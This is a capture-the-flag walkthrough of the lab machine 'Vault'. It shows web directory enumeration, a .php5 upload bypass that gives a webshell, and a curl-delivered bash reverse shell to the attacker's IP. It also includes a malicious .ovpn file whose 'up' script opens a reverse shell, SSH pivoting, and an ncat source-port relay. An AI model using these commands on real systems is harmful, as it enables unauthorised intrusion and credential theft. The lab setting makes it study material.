# Vault

## Gaining Access:

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (3805).png" alt=""><figcaption></figcaption></figure>

### Sparklays Directories

Port 80 shows this page here.

<figure><img src="../../../.gitbook/assets/image (1651).png" alt=""><figcaption></figcaption></figure>

The hint here is to check the `/sparklays` directory, which returns a 403 error.

<figure><img src="../../../.gitbook/assets/image (1685).png" alt=""><figcaption></figcaption></figure>

Since we know this directory exists, what we can do is to use `gobuster` on the `/sparklays` directory to find others. Doing this reveals the `/design` directory.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -u http://10.129.99.48/sparklays -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.99.48/sparklays
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/01/21 22:06:14 Starting gobuster in directory enumeration mode
===============================================================
/design               (Status: 301) [Size: 323] [-> http://10.129.99.48/sparklays/design/]
```

I also ran a `feroxbuster` scan to leverage on its recursive scans, and found some more directories.

<figure><img src="../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

These directories returned nothing, so I did another `gobuster` scan with the `-x` flag to indicate file extensions like .html or .php.

I found the `design.html` page:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -u http://10.129.99.48/sparklays/design -x php,html,txt -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.99.48/sparklays/design
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2023/01/21 22:12:17 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 309]
/.php                 (Status: 403) [Size: 308]
/uploads              (Status: 301) [Size: 331] [-> http://10.129.99.48/sparklays/design/uploads/]                                                                                       
/design.html          (Status: 200) [Size: 72]
```

### Logo Changing

On the `design.html` page, all we see is this:

<figure><img src="../../../.gitbook/assets/image (2775).png" alt=""><figcaption></figcaption></figure>

This brings us to `changelogo.php`, which allows us to upload a file. Only image file are allowed. Obviously, we have to upload a PHP webshell somehow and bypass the file type check. I tried with multiple PHP extensions, and found that `.php5` works.

<figure><img src="../../../.gitbook/assets/image (2796).png" alt=""><figcaption></figcaption></figure>

```
$ curl http://sparklays.com/sparklays/design/uploads/test1.php5?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now, we have RCE on the machine and can get a reverse shell. We can use this command here:

```
$ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1"' http://sparklays.com/sparklays/design/uploads/test1.php5
```

<figure><img src="../../../.gitbook/assets/image (1235).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Dave Credentials

There are a few users on this machine:

```
www-data@ubuntu:/home$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Jun  2  2021 .
drwxr-xr-x 24 root root 4096 Dec  2  2021 ..
drwxr-xr-x 19 alex alex 4096 Jun  2  2021 alex
drwxr-xr-x 18 dave dave 4096 Jun  2  2021 dave
```

Within the `/home/dave/Desktop` directory ,we can find a `ssh` file that has credentials for `dave` within it.

```
www-data@ubuntu:/home/dave/Desktop$ cat ssh
dave
Dav3therav3123
```

<figure><img src="../../../.gitbook/assets/image (3517).png" alt=""><figcaption></figcaption></figure>

### Port Forwarding

There were other files within that directory that had other information. One hinted towards another machine being present on the machine. There was also another key to be used somewhere.

```
www-data@ubuntu:/home/dave/Desktop$ cat Servers
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
www-data@ubuntu:/home/dave/Desktop$ cat key
itscominghome
```

Understanding that we have SSH credentials, we can do some port forwarding with this.&#x20;

```bash
ssh -f -N -D 1080 dave@sparklays.com
```

Then, we can begin to scan both of these machines with `nmap`. Scanning the first 1000 ports, I found that there was indeed a service running on it.

<figure><img src="../../../.gitbook/assets/image (2105).png" alt=""><figcaption></figcaption></figure>

We can take a look at this using a browser with proxychains configured.&#x20;

### DNS Server

The page reveals a DNS server:

<figure><img src="../../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>

The first link doesn't work, but the second brings us to this page where .ovpn files can be uploaded and tested.

<figure><img src="../../../.gitbook/assets/image (3320).png" alt=""><figcaption></figcaption></figure>

Googling around for possible exploits reveals that it is possible for us to gain a reverse shell using .ovpn files. First we need to find the local IP Address of the machine, which is 192.168.122.1 when inspecting `ip addr` output.

<figure><img src="../../../.gitbook/assets/image (2390).png" alt=""><figcaption></figcaption></figure>

Then, we can input the following file and run Test VPN.&#x20;

```
remote 192.168.122.1
dev tun
nobind
script-security 2 
up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/4444 0>&1'"
```

Take note that we have to use the IP address **of the machine** and not our own. With the SSH access we have, we can open a listener port and catch a root shell:

<figure><img src="../../../.gitbook/assets/image (2607).png" alt=""><figcaption></figcaption></figure>

Here, we can grab the user flag from `/home/dave`. Then we can find more credentials for `dave` on this machine:

```
root@DNS:/home/dave# cat ssh
cat ssh
dave
dav3gerous567
```

We can then SSH in as `dave` on the DNS server. This helps to upgrade our shell.

<figure><img src="../../../.gitbook/assets/image (3598).png" alt=""><figcaption></figcaption></figure>

We are allowed to run `sudo` on everything as `dave` within the DNS server, so regaining root permissions is easy.

### Vault

There was nothing else to be done with the DNS server or other IP addresses. Then, I remembered that there was a **Vault** entry that did not have an IP address. I wanted to find this IP address, so I read the `/etc/hosts` file.

```
root@DNS:/etc/network# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       DNS
192.168.5.2     Vault
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

However, I could not even ping this machine from any host. I decided to read the `/var/log` files to see if I could find anything of use. That's when I noticed these few lines within the `auth.log` file that raised eyebrows:

```
Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:20 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0)
Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53

Jul 24 15:06:10 DNS sshd[1466]: Accepted password for dave from 192.168.5.2 port 4444 ssh2

Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
```

There were some `ncat` and `nmap` commands ran on the machine, and it seems that `dave` was able to access port 4444 on the Vault IP using SSH.

I repeated the `nmap` command on the DNS server, and found some interesting results:

```
root@DNS:/var/log# /usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f

Starting Nmap 7.01 ( https://nmap.org ) at 2023-01-22 04:03 GMT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0023s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE
987/tcp open  unknown
```

Overall it seems that we can only access this port if our source port is configured as 4444. I proceeded to scan 192.168.5.2, and found some more ports that were open.

```
root@DNS:/var/log# nmap -Pn 192.168.5.2

Starting Nmap 7.01 ( https://nmap.org ) at 2023-01-22 04:06 GMT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0023s latency).
Not shown: 998 filtered ports
PORT     STATE  SERVICE
53/tcp   closed domain
4444/tcp closed krb524
```

Interesting that port 4444 was open. So we can only detect port 987 should our source port be 4444.&#x20;

The solution in this case is to open a random port via `ncat` that would listen to the connection between port 4444 and 987.

```bash
/usr/bin/ncat -l 3333 --sh-exec "ncat -p 4444 192.168.5.2 987"
```

The logs revealed that this could potentially be an SSH service for `dave`, so I tried just that and it worked! The same credentials for `dave` on the DNS server were used.&#x20;

<figure><img src="../../../.gitbook/assets/image (3316).png" alt=""><figcaption></figcaption></figure>

### Decrypt Flag

Here, we find an encrypted root flag.

```
dave@vault:~$ ls
root.txt.gpg
dave@vault:~$ file root.txt.gpg
root.txt.gpg: PGP RSA encrypted session key - keyid: 10C678C7 31FEBD1 RSA (Encrypt or Sign) 4096b .
```

Earlier, we found a key with `itscominghome` in it. We just need to import it and decrypt this root flag. The easiest way to do so is to first transfer the file to another machine. There was no `base64`, but there was `base32`.

I transferred this to the `ubuntu` machine because it (probably) had the keys imported and ready to go.

Then, we can use `gpg -d` to decrypt it.

<figure><img src="../../../.gitbook/assets/image (1463).png" alt=""><figcaption></figcaption></figure>

Rooted!

## Beyond Root

I wanted to see if it was possible to get a root shell on the Vault. I transferred LinPEAS to the Vault machine. There was a restricted bash shell that could be escaped using `sh`.

One possible attack vector:

<figure><img src="../../../.gitbook/assets/image (2086).png" alt=""><figcaption></figcaption></figure>

However, I could not find any other weaknesses within it. I also couldn't run `pspy64` to view any exploitable crons running. Oh well.
